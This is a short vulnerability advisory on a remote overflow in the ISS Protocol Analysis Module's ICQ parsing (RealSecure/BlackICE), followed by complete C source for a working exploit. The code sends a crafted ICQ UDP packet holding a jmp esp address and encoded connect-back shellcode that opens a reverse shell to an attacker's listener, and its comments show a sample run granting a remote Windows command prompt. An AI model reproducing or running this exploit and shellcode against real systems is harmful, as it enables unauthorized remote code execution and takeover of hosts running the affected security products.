source: http://www.securityfocus.com/bid/9913/info

It has been reported that the Internet Security Systems (ISS) Protocol Analysis Module is prone to a remote buffer overflow vulnerability when parsing the ICQ protocol. This issue exists due to insufficient bounds checking performed on certain unspecified ICQ protocol fields supplied in ICQ response data.

Successful exploitation of this issue may allow a remote attacker to execute arbitrary code on a vulnerable system in order to gain unauthorized access. This attack would occur in the context of the vulnerable process. 

This module is used to parse network protocols and is included in a number of products provided by ISS, including various RealSecure and BlackICE releases.

/* 557iss_pam_exp - RealSecure / Blackice ICQ iss_pam1.dll remote overflow exploit
*
* Copyright (c) SST 2004 All rights reserved.
*
* Public version
*
* code by Sam (Sam`@efnet) and 2004/03/26
* <chen_xiaobo@venustech.com.cn>
* <Sam@0x557.org>
*
*
*
* Compile: gcc -o 557iss_pam_exp 557iss_pam_exp.c
*
* how works?
* [root@core exp]# ./557iss_pam_exp 192.168.10.2 192.168.10.169 5570
* 557iss_pam_exp - RealSecure / Blackice iss_pam1.dll remote overflow exploit
* - Sam
*
* # attack remote host: 192.168.10.2.
* # listen host: 192.168.10.169.
* # listen port: 5570.
* # send overflow udp datas
* # 1199 bytes send
* # done.
* # make sure we are in, dude :)
*
*
* [root@core root]# nc -vv -l -p 5570
* listening on [any] 5570 ...
* 192.168.10.2: inverse host lookup failed: Host name lookup failure
* connect to [192.168.10.169] from (UNKNOWN) [192.168.10.2] 3604
* Microsoft Windows XP [Version 5.1.2600]
* (C) Copyright 1985-2001 Microsoft Corp.
*
* C:\Program Files\ISS\BlackICE>
* C:\Program Files\ISS\BlackICE>
* C:\Program Files\ISS\BlackICE>
*
*
* some thanks/greets to:
* eeye (they find this bug :D), airsupply, kkqq, icbm, my gf :I
* and everyone else who's KNOW SST ;P
* http://0x557.org
*/

#include <stdio.h>
#include <unistd.h>
#include <stdarg.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <assert.h>
#include <fcntl.h>
#include <sys/time.h>

char icq_header [] =
"\x05\x00" // ICQ VERSION
"\x00" // unused
"\x00\x00\x00\x00" // Session ID
"\x12\x02" // reply to SRV_MULTI_PACKET
"\x00\x00\x00\x00" // SEQ_NUM1 and SEQ_NUM2
"\x00\x00\x00\x00" // UIN Your (the client's) UIN
"\x00\x00\x00\x00" // CHECKCODE
"\x02" // SRV_MULTI Parameter Block 1 of 2
// Number of individual responses
"\x2c\x00" // Size of sub-response (44 bytes, little-endian)

"\x05\x00" // ICQ VERSION
"\x00" // unused
"\x00\x00\x00\x00" // Session ID
"\x6e\x00" // reply to SRV_USER_OLINE
"\x00\x00\x00\x00" // SEQ_NUM1 and SEQ_NUM2
"\x00\x00\x00\x00" // UIN Your (the client's) UIN
"\x00\x00\x00\x00" // CHECKCODE
"\x00\x00\x00\x00" // UIN of user changing status
"\x01\x00\x00\x00" // Other user's IP address (1.0.0.0)
"\x00\x00\x00\x00" // Other user's direct-connect port (default)
"\x00"
"\x00\x00\x00\x00"
"\x00\x00\x00\x00"
"\x00\x00"
"\x41\x02" // SRV_MULTI Parameter Block 2 of 2
// Size of sub-response (577 bytes)

"\x05\x00" // ICQ VERSION
"\x00" // unused
"\x00\x00\x00\x00" // Session ID
"\xde\x03" // reply to SRV_META_USER
"\x00\x00\x00\x00" // SEQ_NUM1 and SEQ_NUM2
"\x00\x00\x00\x00" // UIN Your (the client's) UIN
"\x00\x00\x00\x00" // CHECKCODE
"\x00\x00\x00\x01"
"\x00\x00\x01\x00"
"\x00\x01\x00\x00"
"\x1e\x02";


struct sockaddr_in addr, local;
char *bindHost = NULL;
unsigned short port;
/*
* hsj's connect back shellcodes
*/
char shellcode [] =
/* decoder */
"\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1b\x8d\xa0\x01"
"\xfc\xff\xff\x83\xe4\xfc\x8b\xec\x33\xc9\x66\xb9\x99\x01\x80\x30"
"\x93\x40\xe2\xfa"
/* code */
"\x7b\xe4\x93\x93\x93\xd4\xf6\xe7\xc3\xe1\xfc\xf0\xd2\xf7\xf7\xe1"
"\xf6\xe0\xe0\x93\xdf\xfc\xf2\xf7\xdf\xfa\xf1\xe1\xf2\xe1\xea\xd2"
"\x93\xd0\xe1\xf6\xf2\xe7\xf6\xc3\xe1\xfc\xf0\xf6\xe0\xe0\xd2\x93"
"\xd0\xff\xfc\xe0\xf6\xdb\xf2\xfd\xf7\xff\xf6\x93\xd6\xeb\xfa\xe7"
"\xc7\xfb\xe1\xf6\xf2\xf7\x93\xe4\xe0\xa1\xcc\xa0\xa1\x93\xc4\xc0"
"\xd2\xc0\xe7\xf2\xe1\xe7\xe6\xe3\x93\xc4\xc0\xd2\xc0\xfc\xf0\xf8"
"\xf6\xe7\xd2\x93\xf0\xff\xfc\xe0\xf6\xe0\xfc\xf0\xf8\xf6\xe7\x93"
"\xf0\xfc\xfd\xfd\xf6\xf0\xe7\x93\xf0\xfe\xf7\x93\xc9\xc1\x28\x93"
"\x93\x63\xe4\x12\xa8\xde\xc9\x03\x93\xe7\x90\xd8\x78\x66\x18\xe0"
"\xaf\x90\x60\x18\xe5\xeb\x90\x60\x18\xed\xb3\x90\x68\x18\xdd\x87"
"\xc5\xa0\x53\xc4\xc2\x18\xac\x90\x68\x18\x61\xa0\x5a\x22\x9d\x60"
"\x35\xca\xcc\xe7\x9b\x10\x54\x97\xd3\x71\x7b\x6c\x72\xcd\x18\xc5"
"\xb7\x90\x40\x42\x73\x90\x51\xa0\x5a\xf5\x18\x9b\x18\xd5\x8f\x90"
"\x50\x52\x72\x91\x90\x52\x18\x83\x90\x40\xcd\x18\x6d\xa0\x5a\x22"
"\x97\x7b\x08\x93\x93\x93\x10\x55\x98\xc1\xc5\x6c\xc4\x63\xc9\x18"
"\x4b\xa0\x5a\x22\x97\x7b\x14\x93\x93\x93\x10\x55\x9b\xc6\xfb\x92"
"\x92\x93\x93\x6c\xc4\x63\x16\x53\xe6\xe0\xc3\xc3\xc3\xc3\xd3\xc3"
"\xd3\xc3\x6c\xc4\x67\x10\x6b\x6c\xe7\xf0\x18\x4b\xf5\x54\xd6\x93"
"\x91\x93\xf5\x54\xd6\x91\x28\x39\x54\xd6\x97\x4e\x5f\x28\x39\xf9"
"\x83\xc6\xc0\x6c\xc4\x6f\x16\x53\xe6\xd0\xa0\x5a\x22\x82\xc4\x18"
"\x6e\x60\x38\xcc\x54\xd6\x93\xd7\x93\x93\x93\x1a\xce\xaf\x1a\xce"
"\xab\x1a\xce\xd3\x54\xd6\xbf\x92\x92\x93\x93\x1e\xd6\xd7\xc3\xc6"
"\xc2\xc2\xc2\xd2\xc2\xda\xc2\xc2\xc5\xc2\x6c\xc4\x77\x6c\xe6\xd7"
"\x6c\xc4\x7b\x6c\xe6\xdb\x6c\xc4\x7b\xc0\x6c\xc4\x6b\xc3\x6c\xc4"
"\x7f\x19\x95\xd5\x17\x53\xe6\x6a\xc2\xc1\xc5\xc0\x6c\x41\xc9\xca"
"\x1a\x94\xd4\xd4\xd4\xd4\x71\x7a\x50";




/* udpconnect:
*
*/
int udpConnect (char *hostName)
{

struct hostent* host = NULL;
int sock = -1;

host = gethostbyname (hostName);
if (NULL == host) {
perror ("gethostbyname() failed");
return -1;
}

sock = socket (AF_INET, SOCK_DGRAM, IPPROTO_UDP);
if ( -1 == sock) {
perror ("socket() failed\n");
return -1;
}

memset (&addr, 0x00, sizeof (addr));
addr.sin_addr = *(struct in_addr *) host->h_addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(random());

memset (&local, 0x00, sizeof (local));
local.sin_family = AF_INET;
local.sin_addr.s_addr = htonl (INADDR_ANY);
local.sin_port = htons(4000);


if (bind (sock, (struct sockaddr *) &local, sizeof(local)) != 0) {
perror ("bind error\n");
return -1;
}

return sock;
}

/* resolve listen host
*/
unsigned int resolve (char *name)
{
struct hostent *he;
unsigned int ip;

if ((ip = inet_addr (name)) == (-1)) {
if ((he = gethostbyname (name)) ==0 )
return 0;
memcpy (&ip, he->h_addr, 4);
}
return ip;
}


/*
* send datas
*/
int udp_send (int sock, char *buffer, int buff_len)
{
int ret;

ret = sendto (sock, buffer, buff_len, 0, (struct sockaddr *)&addr,
sizeof (struct sockaddr_in));
if (ret <= NULL) {
perror ("sendto failed\n");
return -1;
}

fprintf (stderr, "# %d bytes send\n", ret);

return ret;
}

/*
* send evil datas, fuck ISS's blackice.
*/
int do_sendudp_data (char *hostName)
{
unsigned int cb;
int sock;
char expbuf[1200];

memset (expbuf, 0x90, sizeof (expbuf));
memcpy (expbuf, icq_header, sizeof (icq_header) - 1);

/*
* jmp esp opcodes from iss_pam1.dll
*/
*(unsigned int *)&expbuf[637] = 0x5e077663;

if (!(cb = resolve (bindHost))) {
printf ("Unknown listen host\n");
return -1;
}
port = htons (port);
port ^= 0x9393;
cb ^= 0x93939393;

*(unsigned short *)&shellcode[330] = port;
*(unsigned int *)&shellcode[335] = cb;

memcpy (expbuf + 637 + 4, shellcode, strlen (shellcode));
if ((sock = udpConnect (hostName)) < 0) {
printf ("connect failed\n");
exit (-1);
}

fprintf (stderr, "# send overflow udp datas\n");
udp_send (sock, expbuf, sizeof (expbuf) - 1);

close (sock);
return 0;


}


/*
* just main . dude.
*/
int main (int argc, char **argv)
{
int new;
char *target = NULL;

fprintf (stderr, "557iss_pam_exp - RealSecure / Blackice iss_pam1.dll remote overflow exploit\n - Sam\n\n");
if (argc != 4) {
fprintf (stderr, "%s <hostname> <listenhost> <listen port>\n", argv[0]);
fprintf (stderr, "listenhost, port: connect back host and port\n\n");
return -1;
}

target = argv[1];
bindHost = argv[2];
port = atoi (argv[3]);

fprintf (stderr, "# attack remote host: %s. \n", target);
fprintf (stderr, "# listen host: %s. \n", bindHost);
fprintf (stderr, "# listen port: %d. \n", port);
do_sendudp_data (target);

fprintf (stderr, "# done.\n");

fprintf (stderr, "# make sure we are in, dude :)\n\n");

return 0;
}
